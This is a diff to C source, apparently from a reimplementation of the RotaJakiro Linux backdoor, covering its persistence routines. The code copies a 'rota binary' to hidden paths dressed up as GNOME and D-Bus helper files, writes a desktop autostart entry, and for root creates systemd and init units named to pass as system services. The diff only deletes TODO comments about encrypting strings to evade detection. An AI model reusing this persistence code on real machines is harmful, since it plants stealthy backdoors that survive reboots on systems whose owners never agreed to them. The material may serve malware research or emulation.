@@ -124,14 +124,11 @@ bool nonroot_desktop_persistence() {
         mkdir(dirpath, 0755);
     }
 
-    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     bool result = write_to_file(fpath, gnomehelper_desktop);
 
     // -------- copy userland binary now -------------
     //
     // copy rota binary to /home/$USER/.fvfsd/.profile/gvfsd-helper
-    // TODO convert gvfsd_helper into char array
-    // TODO decrypt and rotate char array below
 
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
@@ -186,8 +183,6 @@ bool nonroot_desktop_persistence() {
     // -------- copy userland binary now -------------
     //
     // copy rota binary to /home/$USER/.dbus/sessions/session-dbus
-    // TODO convert session-dbus into an encrypted char array
-    // TODO decrypt and rotate char array below
 
     char *session_dbus= "/.dbus/sessions/session-dbus";
     fpath_size = strlen(HOME) + strlen(session_dbus);
@@ -274,7 +269,6 @@ bool root_persistence(void) {
     bool result;
     char *fpath;
 
-    // TODO - stack strings, encrypt+rotate
     char *init_path_1 = "/etc/init/systemd-agent.conf";
     char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";
 
